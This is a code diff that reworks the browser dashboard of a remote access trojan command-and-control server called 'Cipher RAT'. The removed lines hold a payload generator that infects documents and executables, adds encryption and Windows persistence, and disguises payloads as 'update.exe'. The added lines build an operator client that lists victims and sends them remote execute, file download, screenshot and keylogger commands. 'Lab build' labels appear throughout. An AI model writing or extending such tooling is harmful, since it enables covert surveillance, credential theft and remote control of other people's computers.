@@ -1,570 +1,171 @@
 <!DOCTYPE html>
+<!--
+  Cipher C2 — Operator Dashboard (FIXED BUILD)
+  =============================================
+  Changes vs. original:
+   [4] Now a real Socket.IO *operator* client: authenticates with the API
+       key, receives live client list + results over the socket, and sends
+       commands via `dashboard_command` instead of only polling REST.
+   [5] No hardcoded API key. The operator pastes the key shown on the
+       server console; the UI verifies it against /api/config's masked
+       fingerprint before trusting it.
+   Listens for the canonical result events: client_joined,
+       client_disconnected, client_response, keylogData, screenshot_data,
+       file_list, command_sent, command_rejected, operator_event.
+-->
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CIPHER RAT - C2 Dashboard</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <script src="/socket.io/socket.io.js"></script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Cipher RAT Dashboard — Lab Build</title>
+<link rel="stylesheet" href="style.css" />
+<script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
-    <div class="app-container">
-        <!-- Sidebar -->
-        <aside class="sidebar">
-            <div class="logo">
-                <i class="fas fa-shield-halved"></i>
-                <span>CIPHER RAT</span>
-            </div>
-            
-            <nav class="nav-menu">
-                <button class="nav-btn active" data-page="dashboard"><i class="fas fa-gauge-high"></i><span>Dashboard</span></button>
-                <button class="nav-btn" data-page="generator"><i class="fas fa-wand-magic-sparkles"></i><span>Payload Generator</span></button>
-                <button class="nav-btn" data-page="clients"><i class="fas fa-users"></i><span>Clients</span></button>
-                <button class="nav-btn" data-page="storage"><i class="fas fa-database"></i><span>Data Storage</span></button>
-                <button class="nav-btn" data-page="settings"><i class="fas fa-gear"></i><span>Settings</span></button>
-            </nav>
-            
-            <!-- Theme Toggle Button -->
-            <button class="theme-toggle" id="theme-toggle" title="Toggle theme">
-                <i class="fas fa-moon icon-moon"></i>
-                <i class="fas fa-sun icon-sun"></i>
-                <span>Toggle Theme</span>
-            </button>
-            
-            <div class="status-bar">
-                <div class="status-item" id="server-status-item"><span class="status-dot" id="server-dot"></span><span id="server-status-text">Server: Checking...</span></div>
-                <div class="status-item" id="port-status-item"><span class="status-dot" id="port-dot"></span><span id="port-status-text">Port: 8443</span></div>
-                <div class="status-item" id="clients-status-item"><span class="status-dot" id="clients-dot"></span><span id="clients-status-text">Clients: 0</span></div>
-            </div>
-        </aside>
+<header>
+  <h1>CIPHER <span>C2</span> <small>lab build v2</small></h1>
+  <div id="conn-status" class="status-dot off" title="connection status"></div>
+</header>
 
-        <!-- Main Content -->
-        <main class="main-content">
-            <!-- Dashboard Page -->
-            <section class="page active" id="dashboard">
-                <h2><i class="fas fa-gauge-high"></i> Dashboard</h2>
-                <div class="dashboard-stats">
-                    <div class="stat-card">
-                        <i class="fas fa-users"></i>
-                        <div class="stat-info">
-                            <div class="stat-value">0</div>
-                            <div class="stat-label">Total Clients</div>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <i class="fas fa-box"></i>
-                        <div class="stat-info">
-                            <div class="stat-value">0</div>
-                            <div class="stat-label">Payloads Created</div>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <i class="fas fa-file"></i>
-                        <div class="stat-info">
-                            <div class="stat-value">0</div>
-                            <div class="stat-label">Files Stored</div>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <i class="fas fa-clock"></i>
-                        <div class="stat-info">
-                            <div class="stat-value">0s</div>
-                            <div class="stat-label">Server Uptime</div>
-                        </div>
-                    </div>
-                </div>
+<main>
+  <!-- Login / API key panel -->
+  <section id="login-panel" class="card">
+    <h2>Operator Login</h2>
+    <p class="hint">Paste the API key printed on the C2 server console (or stored in <code>.api_key</code>).</p>
+    <input id="apikey-input" type="password" placeholder="API key…" autocomplete="off" />
+    <button id="btn-connect">Connect</button>
+    <div id="key-fingerprint" class="hint"></div>
+  </section>
 
-                <div class="content-section">
-                    <h3><i class="fas fa-bolt"></i> Quick Actions</h3>
-                    <!-- data-target attributes connect these to the sidebar pages -->
-                    <div class="actions-grid">
-                        <button class="action-btn" data-target="generator"><i class="fas fa-wand-magic-sparkles"></i><span>Create Payload</span></button>
-                        <button class="action-btn" data-target="clients"><i class="fas fa-users"></i><span>View Clients</span></button>
-                        <button class="action-btn" data-target="storage"><i class="fas fa-database"></i><span>Storage</span></button>
-                        <button class="action-btn" data-target="settings"><i class="fas fa-gear"></i><span>Settings</span></button>
-                    </div>
-                </div>
-
-                <div class="content-section">
-                    <h3><i class="fas fa-clock-rotate-left"></i> Recent Activity</h3>
-                    <div class="activity-list">
-                        <div class="activity-item">
-                            <i class="fas fa-circle-check"></i>
-                            <span>C2 Server started on port 8443</span>
-                            <span class="activity-time">Just now</span>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Generator Page -->
-            <section class="page" id="generator">
-                <h2><i class="fas fa-wand-magic-sparkles"></i> Payload Generator</h2>
-                <div class="generator-container">
-                    <div class="generator-section">
-                        <h3><i class="fas fa-file-circle-plus"></i> Select File to Infect</h3>
-                        <div class="file-selection">
-                            <input type="radio" name="file-mode" id="existing" value="infect" checked>
-                            <label for="existing" class="file-option">
-                                <i class="fas fa-file-import"></i>
-                                <div>
-                                    <span>Select Existing File</span>
-                                    <span class="file-name" id="file-name-display">No file selected</span>
-                                    <input type="file" id="file-input" accept=".pdf,.doc,.docx,.xls,.xlsx,.jpg,.jpeg,.png,.gif,.exe,.bat,.cmd,.js,.py,.txt">
-                                </div>
-                            </label>
-                            <input type="radio" name="file-mode" id="standalone" value="standalone">
-                            <label for="standalone" class="file-option">
-                                <i class="fas fa-cube"></i>
-                                <div>
-                                    <span>Create Standalone Payload</span>
-                                    <span class="file-name">No file needed</span>
-                                </div>
-                            </label>
-                        </div>
-                    </div>
-
-                    <div class="generator-section">
-                        <h3><i class="fas fa-sliders"></i> Configuration</h3>
-                        <div class="config-options">
-                            <div class="form-group">
-                                <label>C2 Server Address:</label>
-                                <input type="text" value="127.0.0.1:8443">
-                            </div>
-                            <div class="form-group">
-                                <label>Payload Name:</label>
-                                <input type="text" value="update.exe">
-                            </div>
-                            <div class="form-group">
-                                <label>Save Path:</label>
-                                <input type="text" id="save-path" value="payloads" placeholder="e.g., C:\\RAT\\payloads or payloads">
-                            </div>
-                            <div class="form-group">
-                                <label>Payload Type:</label>
-                                <div class="radio-group">
-                                    <label><input type="radio" name="type" checked> .exe (Executable)</label>
-                                    <label><input type="radio" name="type"> .py (Python Script)</label>
-                                </div>
-                            </div>
-                            <div class="form-group encryption-options">
-                                <label>Encryption:</label>
-                                <div class="checkbox-group">
-                                    <label><input type="checkbox"> Encrypt payload (AES-256)</label>
-                                    <input type="password" placeholder="Encryption key (optional)">
-                                </div>
-                            </div>
-                            <div class="form-group">
-                                <label>Persistence:</label>
-                                <div class="checkbox-group">
-                                    <label><input type="checkbox"> Add to Windows Startup</label>
-                                    <label><input type="checkbox"> Add to Windows Registry</label>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="generator-section output-section">
-                        <h3><i class="fas fa-file-export"></i> Generated Payload</h3>
-                        <div class="progress-container">
-                            <div class="progress-bar"></div>
-                            <span class="progress-text">Ready to generate</span>
-                        </div>
-                        <div class="generated-files"></div>
-                        <button class="btn btn-primary"><i class="fas fa-bolt"></i> Generate Payload</button>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Clients Page -->
-            <section class="page" id="clients">
-                <h2><i class="fas fa-users"></i> Connected Clients</h2>
-                <div class="clients-controls">
-                    <input type="text" placeholder="Search clients...">
-                    <button class="btn"><i class="fas fa-rotate"></i> Refresh</button>
-                </div>
-                <div class="clients-grid"></div>
-            </section>
-
-            <!-- Storage Page -->
-            <section class="page" id="storage">
-                <h2><i class="fas fa-database"></i> Data Storage</h2>
-                <div class="storage-controls">
-                    <select><option>All Clients</option></select>
-                    <select><option>All Types</option><option>Screenshots</option><option>Files</option><option>Keylogs</option></select>
-                    <button class="btn btn-danger"><i class="fas fa-trash"></i> Clear All</button>
-                </div>
-                <div class="storage-grid"></div>
-            </section>
-
-            <!-- Settings Page -->
-            <section class="page" id="settings">
-                <h2><i class="fas fa-gear"></i> Settings</h2>
-                <div class="settings-container">
-                    <div class="settings-section">
-                        <h3><i class="fas fa-server"></i> Server Configuration</h3>
-                        <div class="form-group">
-                            <label>Server Port:</label>
-                            <input type="number" value="8443">
-                        </div>
-                        <div class="form-group">
-                            <label>C2 Host:</label>
-                            <input type="text" value="0.0.0.0">
-                        </div>
-                    </div>
-                    <div class="settings-section">
-                        <h3><i class="fas fa-box"></i> Payload Settings</h3>
-                        <div class="form-group">
-                            <label>Default C2 Address:</label>
-                            <input type="text" value="127.0.0.1:8443">
-                        </div>
-                        <div class="form-group">
-                            <label>Encryption Key:</label>
-                            <input type="password" placeholder="Leave empty for random">
-                        </div>
-                    </div>
-                    <div class="settings-section">
-                        <h3><i class="fas fa-gears"></i> System Settings</h3>
-                        <div class="checkbox-group">
-                            <label><input type="checkbox"> Auto-start on boot</label>
-                        </div>
-                        <button class="btn btn-primary"><i class="fas fa-floppy-disk"></i> Save Settings</button>
-                    </div>
-                </div>
-            </section>
-        </main>
+  <!-- Clients -->
+  <section id="clients-panel" class="card hidden">
+    <h2>Victims (lab implants)</h2>
+    <table id="client-table">
+      <thead><tr><th>ID</th><th>Host</th><th>Platform</th><th>IP</th><th>Last seen</th><th>Status</th><th></th></tr></thead>
+      <tbody></tbody>
+    </table>
+    <div class="toolbar">
+      <select id="cmd-action">
+        <option value="execute">execute</option>
+        <option value="list_files">list_files</option>
+        <option value="screenshot">screenshot</option>
+        <option value="download_file">download_file</option>
+        <option value="start_keylogger">start_keylogger</option>
+        <option value="stop_keylogger">stop_keylogger</option>
+        <option value="ping">ping</option>
+      </select>
+      <input id="cmd-params" placeholder='params JSON, e.g. {"command":"id"} or {"dir":"."}' size="40" />
+      <button id="btn-send">Send to selected</button>
+      <label class="switch-label"><input type="checkbox" id="master-toggle" /> broadcast ping/stop-all</label>
     </div>
+  </section>
 
-    <!-- Client Details Modal -->
-    <div class="modal" id="client-modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3><i class="fas fa-user-shield"></i> Client Details</h3>
-                <button class="close-btn">&times;</button>
-            </div>
-            <div class="modal-body">
-                <div class="client-info">
-                    <div class="info-row"><span>Client ID:</span><span class="value">-</span></div>
-                    <div class="info-row"><span>IP Address:</span><span class="value">-</span></div>
-                    <div class="info-row"><span>Operating System:</span><span class="value">-</span></div>
-                    <div class="info-row"><span>Hostname:</span><span class="value">-</span></div>
-                    <div class="info-row"><span>Username:</span><span class="value">-</span></div>
-                    <div class="info-row"><span>Platform:</span><span class="value">-</span></div>
-                    <div class="info-row"><span>Connection Time:</span><span class="value">-</span></div>
-                </div>
-                <div class="remote-controls">
-                    <h3>Remote Control</h3>
-                    <div class="control-buttons">
-                        <button class="btn btn-small"><i class="fas fa-camera"></i> Screenshot</button>
-                        <button class="btn btn-small"><i class="fas fa-terminal"></i> Command</button>
-                        <button class="btn btn-small"><i class="fas fa-file-arrow-down"></i> Files</button>
-                        <button class="btn btn-small"><i class="fas fa-keyboard"></i> Keylogger</button>
-                        <button class="btn btn-small btn-danger"><i class="fas fa-plug-circle-xmark"></i> Disconnect</button>
-                    </div>
-                    <textarea id="command-output" placeholder="Command output will appear here..."></textarea>
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button class="btn close-btn-modal">Close</button>
-            </div>
-        </div>
-    </div>
+  <!-- Output streams -->
+  <section id="output-panel" class="card hidden">
+    <h2>Event Stream</h2>
+    <pre id="event-log"></pre>
+  </section>
+  <section id="keylog-panel" class="card hidden">
+    <h2>Keylog Feed (simulated data)</h2>
+    <pre id="keylog-view"></pre>
+  </section>
+  <section id="screen-panel" class="card hidden">
+    <h2>Last Screenshot</h2>
+    <img id="screen-img" alt="no screenshot yet" />
+  </section>
+</main>
 
-    <script>
-        // Wait for the DOM to fully load before running scripts
-        document.addEventListener('DOMContentLoaded', () => {
-            
-            // ==========================================
-            // Unified Page Navigation System
-            // ==========================================
-            function switchPage(pageId) {
-                // 1. Update sidebar active state
-                document.querySelectorAll('.nav-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                    if (btn.dataset.page === pageId) {
-                        btn.classList.add('active');
-                    }
-                });
+<footer>Educational lab use only — isolated network. Detection exercises come later.</footer>
 
-                // 2. Update page visibility
-                document.querySelectorAll('.page').forEach(page => {
-                    page.classList.remove('active');
-                });
-                
-                const targetPage = document.getElementById(pageId);
-                if (targetPage) {
-                    targetPage.classList.add('active');
-                }
-            }
+<script>
+(() => {
+  const $ = (s) => document.querySelector(s);
+  let socket = null;
+  let apiKey = null;
+  const clients = new Map();          // client_id -> record
+  let selectedClient = null;
 
-            // Sidebar Navigation Listeners
-            document.querySelectorAll('.nav-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    if (btn.dataset.page) switchPage(btn.dataset.page);
-                });
-            });
+  const logEl = $('#event-log');
+  function log(line) {
+    logEl.textContent += `[${new Date().toISOString().slice(11,19)}] ${line}\n`;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
 
-            // Quick Actions Navigation Listeners
-            document.querySelectorAll('.action-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    if (btn.dataset.target) switchPage(btn.dataset.target);
-                });
-            });
+  // ---- [5] verify typed key against server fingerprint -------------------
+  async function checkFingerprint() {
+    try {
+      const cfg = await (await fetch('/api/config')).json();
+      $('#key-fingerprint').textContent = `server key fingerprint: ${cfg.keyFingerprint}`;
+      return cfg;
+    } catch { $('#key-fingerprint').textContent = 'cannot reach C2 server'; return null; }
+  }
+  checkFingerprint();
 
-            // ==========================================
-            // Theme Toggle System
-            // ==========================================
-            const themeToggle = document.getElementById('theme-toggle');
-            const root = document.documentElement;
-            
-            // Load saved theme (default: dark)
-            const savedTheme = localStorage.getItem('cipher-theme') || 'dark';
-            root.setAttribute('data-theme', savedTheme);
+  function renderClients() {
+    const tb = $('#client-table tbody');
+    tb.innerHTML = '';
+    const now = Date.now();
+    for (const c of clients.values()) {
+      const online = c.online && (now - c.lastSeen < 30000);
+      const tr = document.createElement('tr');
+      tr.className = c.client_id === selectedClient ? 'selected' : '';
+      tr.innerHTML = `<td>${c.client_id}</td><td>${c.hostname||''}</td><td>${c.platform||''}</td>
+        <td>${c.ip||''}</td><td>${Math.round((now-(c.lastSeen||now))/1000)}s ago</td>
+        <td class="status-dot ${online?'on':'off'}"></td>`;
+      tr.onclick = () => { selectedClient = c.client_id; renderClients(); };
+      tb.appendChild(tr);
+    }
+  }
+  setInterval(renderClients, 5000);
 
-            if (themeToggle) {
-                themeToggle.addEventListener('click', () => {
-                    const current = root.getAttribute('data-theme');
-                    const next = current === 'dark' ? 'light' : 'dark';
-                    root.setAttribute('data-theme', next);
-                    localStorage.setItem('cipher-theme', next);
-                });
-            }
+  // ---- [4] connect as operator over the socket ----------------------------
+  $('#btn-connect').onclick = () => {
+    apiKey = $('#apikey-input').value.trim();
+    if (!apiKey) return log('enter the API key first');
+    socket = io({ auth: { apiKey } });   // server middleware tags us 'operator'
 
-            // ==========================================
-            // Modal System
-            // ==========================================
-            document.querySelectorAll('.close-btn, .close-btn-modal').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    document.getElementById('client-modal').classList.remove('active');
-                });
-            });
+    socket.on('connect', () => {
+      $('#conn-status').className = 'status-dot on';
+      socket.emit('operator_hello', { apiKey });
+      log('socket connected, authenticating…');
+    });
+    socket.on('operator_welcome', (snap) => {
+      $('#login-panel').classList.add('hidden');
+      ['#clients-panel','#output-panel','#keylog-panel','#screen-panel'].forEach(s=>$(s).classList.remove('hidden'));
+      (snap.clients||[]).forEach(c => clients.set(c.client_id, c));
+      renderClients();
+      log(`authenticated. ${clients.size} known implant(s).`);
+    });
+    socket.on('operator_denied', (e) => log('AUTH DENIED: ' + e.error));
+    socket.on('disconnect', () => { $('#conn-status').className = 'status-dot off'; log('socket lost'); });
 
-            // ==========================================
-            // File Selection Handler
-            // ==========================================
-            const fileInput = document.getElementById('file-input');
-            const fileNameDisplay = document.getElementById('file-name-display');
+    // Canonical result events from the server:
+    socket.on('client_joined', (c) => { clients.set(c.client_id, {...c, lastSeen: Date.now(), online:true}); renderClients(); log(`implant joined: ${c.client_id} (${c.hostname})`); });
+    socket.on('client_disconnected', (c) => { const r = clients.get(c.client_id); if (r) { r.online=false; renderClients(); } log(`implant lost: ${c.client_id}`); });
+    socket.on('client_response', (m) => { const r = clients.get(m.client_id); if (r) r.lastSeen = Date.now(); log(`response <${m.client_id}> ${m.action||''}: ${String(m.output).slice(0,400)}`); });
+    socket.on('file_list', (m) => log(`files <${m.client_id}> ${m.dir}: ${(m.files||[]).join(', ').slice(0,400)}`));
+    socket.on('keylogData', (m) => { $('#keylog-view').textContent += `${m.keys || ''}`; });
+    socket.on('screenshot_data', (m) => { if (m.base64) $('#screen-img').src = 'data:image/png;base64,' + m.base64; log(`screenshot <${m.client_id}> received`); });
+    socket.on('command_sent', (m) => log(`sent ${m.action} → ${m.client_id} (id ${m.command_id})`));
+    socket.on('command_rejected', (m) => log('REJECTED: ' + m.error));
+    socket.on('operator_event', (m) => { /* audit trail */ });
+  };
 
-            if (fileInput) {
-                fileInput.addEventListener('change', (e) => {
-                    const file = e.target.files[0];
-                    if (file) {
-                        if (fileNameDisplay) fileNameDisplay.textContent = file.name;
-                    } else {
-                        if (fileNameDisplay) fileNameDisplay.textContent = 'No file selected';
-                    }
-                });
-            }
+  // ---- Send command over socket ------------------------------------------
+  $('#btn-send').onclick = () => {
+    if (!socket || !selectedClient) return log('select an implant first');
+    let params = {};
+    const raw = $('#cmd-params').value.trim();
+    if (raw) { try { params = JSON.parse(raw); } catch { return log('params must be valid JSON'); } }
+    socket.emit('dashboard_command', { client_id: selectedClient, action: $('#cmd-action').value, params });
+  };
 
-            // ==========================================
-            // Payload Generator
-            // ==========================================
-            const generatePayloadBtn = document.querySelector('.generator-section .btn-primary');
-            const progressBar = document.querySelector('.generator-section .progress-bar');
-            const progressText = document.querySelector('.generator-section .progress-text');
-
-            if (generatePayloadBtn) {
-                generatePayloadBtn.addEventListener('click', async () => {
-                    // Check if file mode is selected
-                    const fileMode = document.querySelector('input[name="file-mode"]:checked').value;
-                    
-                    if (fileMode === 'existing' && (!fileInput || fileInput.files.length === 0)) {
-                        if (fileNameDisplay) fileNameDisplay.textContent = 'No file selected';
-                        if (progressText) progressText.textContent = 'Error: Please select a file first';
-                        setTimeout(() => {
-                            if (progressBar) progressBar.style.width = '0%';
-                            if (progressText) progressText.textContent = 'Ready to generate';
-                        }, 3000);
-                        return;
-                    }
-
-                    // Update progress
-                    if (progressBar) progressBar.style.width = '30%';
-                    if (progressText) progressText.textContent = 'Connecting to server...';
-
-                    try {
-                        // Get save path from input field (default to 'payloads' if empty)
-                        const savePath = document.getElementById('save-path').value.trim() || 'payloads';
-                        
-                        const formData = new FormData();
-                        formData.append('serverHost', 'localhost');
-                        formData.append('serverPort', '8443');
-                        formData.append('savePath', savePath);
-                        
-                        if (fileMode === 'infect' && fileInput && fileInput.files.length > 0) {
-                            formData.append('file', fileInput.files[0]);
-                        }
-                        formData.append('mode', fileMode);
-
-                        const response = await fetch('/api/generate-payload', {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        if (!response.ok) {
-                            throw new Error(`Server error: ${response.statusText}`);
-                        }
-
-                        // Get filename from header or use default
-                        const contentDisposition = response.headers.get('Content-Disposition');
-                        const filename = contentDisposition 
-                            ? contentDisposition.split('filename=')[1].replace(/"/g, '') 
-                            : 'payload.js';
-
-                        // Download the file
-                        const blob = await response.blob();
-                        const url = window.URL.createObjectURL(blob);
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.download = filename;
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                        window.URL.revokeObjectURL(url);
-
-                        // Update progress
-                        if (progressBar) progressBar.style.width = '100%';
-                        if (progressText) progressText.textContent = 'Payload generated successfully!';
-                        
-                        // Reset progress after delay
-                        setTimeout(() => {
-                            if (progressBar) progressBar.style.width = '0%';
-                            if (progressText) progressText.textContent = 'Ready to generate';
-                        }, 3000);
-
-                    } catch (error) {
-                        console.error('Payload generation error:', error);
-                        if (progressText) progressText.textContent = 'Error: ' + error.message;
-                        
-                        setTimeout(() => {
-                            if (progressBar) progressBar.style.width = '0%';
-                            if (progressText) progressText.textContent = 'Ready to generate';
-                        }, 3000);
-                    }
-                });
-            }
-
-            // ==========================================
-            // Server Toggle Control
-            // ==========================================
-            async function toggleServer(running) {
-                try {
-                    const response = await fetch('/api/toggle', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'X-API-Key': 'c2-admin-key-8443'
-                        },
-                        body: JSON.stringify({ running })
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        console.log(`Server ${running ? 'started' : 'stopped'}:`, data.message);
-                        
-                        // Update toggle UI
-                        document.getElementById('server-toggle').checked = running;
-                        document.getElementById('toggle-label').textContent = running ? 'Server ON' : 'Server OFF';
-                        
-                        // Refresh status
-                        checkServerStatus();
-                        return true;
-                    } else {
-                        console.error('Failed to toggle server:', response.statusText);
-                        return false;
-                    }
-                } catch (error) {
-                    console.error('Error toggling server:', error);
-                    return false;
-                }
-            }
-            
-            // Server toggle event listener
-            document.getElementById('server-toggle').addEventListener('change', (e) => {
-                toggleServer(e.target.checked);
-            });
-            
-            // ==========================================
-            // Server Status Monitoring
-            // ==========================================
-            async function checkServerStatus() {
-                try {
-                    const response = await fetch('/api/health', { 
-                        method: 'GET',
-                        headers: { 'X-API-Key': 'c2-admin-key-8443' }
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        
-                        // Update server status to running
-                        document.getElementById('server-dot').className = 'status-dot online';
-                        document.getElementById('server-status-text').textContent = 'Server: Running';
-                        document.getElementById('server-status-item').style.opacity = '1';
-                        
-                        // Update toggle to ON
-                        document.getElementById('server-toggle').checked = true;
-                        document.getElementById('toggle-label').textContent = 'Server ON';
-                        
-                        // Update client count
-                        document.getElementById('clients-dot').className = 'status-dot online';
-                        document.getElementById('clients-status-text').textContent = `Clients: ${data.clients || 0}`;
-                    }
-                } catch (error) {
-                    // Server is not running
-                    document.getElementById('server-dot').className = 'status-dot offline';
-                    document.getElementById('server-status-text').textContent = 'Server: Not Running';
-                    document.getElementById('server-status-item').style.opacity = '0.7';
-                    
-                    // Update toggle to OFF
-                    document.getElementById('server-toggle').checked = false;
-                    document.getElementById('toggle-label').textContent = 'Server OFF';
-                    
-                    // Show 0 clients when server is offline
-                    document.getElementById('clients-dot').className = 'status-dot offline';
-                    document.getElementById('clients-status-text').textContent = 'Clients: 0';
-                }
-            }
-
-            // Initial check on page load
-            checkServerStatus();
-            
-            // Check every 5 seconds
-            setInterval(checkServerStatus, 5000);
-
-            // Socket.io connection for real-time updates
-            let socket = null;
-            try {
-                socket = io();
-                
-                socket.on('connect', () => {
-                    console.log('Connected to C2 server via WebSocket');
-                    // Force status check after connection
-                    checkServerStatus();
-                });
-                
-                socket.on('connect_error', (error) => {
-                    console.warn('WebSocket connection error:', error);
-                    checkServerStatus(); // Fallback to HTTP polling
-                });
-                
-                socket.on('client_joined', () => {
-                    checkServerStatus(); // Update client count when new client joins
-                });
-                
-                socket.on('client_disconnected', () => {
-                    checkServerStatus(); // Update client count when client disconnects
-                });
-                
-                socket.on('error', (error) => {
-                    console.error('Socket.io error:', error);
-                });
-                
-            } catch (error) {
-                console.warn('WebSocket not available, using HTTP polling only');
-            }
-        });
-    </script>
+  $('#master-toggle').onchange = (e) => {
+    if (!socket) return;
+    socket.emit('dashboard_toggle', { enabled: e.target.checked });
+    log('broadcast toggle: ' + (e.target.checked ? 'ping all' : 'stop-all'));
+  };
+})();
+</script>
 </body>
 </html>
